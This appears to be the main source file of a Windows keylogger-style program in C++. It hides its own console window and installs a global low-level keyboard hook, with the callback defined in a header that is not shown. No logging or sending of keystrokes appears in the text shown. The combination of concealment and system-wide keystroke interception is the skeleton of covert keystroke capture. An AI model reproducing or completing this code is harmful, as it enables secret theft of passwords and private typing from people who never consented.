#include "headers/myKeyboardProcHook.h"

int main()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    uwuHook::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
                                             uwuHook::keyBoardProc,
                                             nullptr,
                                             NULL
                                             );
    MSG msg{nullptr};
    while (GetMessage(&msg, nullptr, 0, 0) != 0);
    UnhookWindowsHookEx(uwuHook::keyboardHook);
}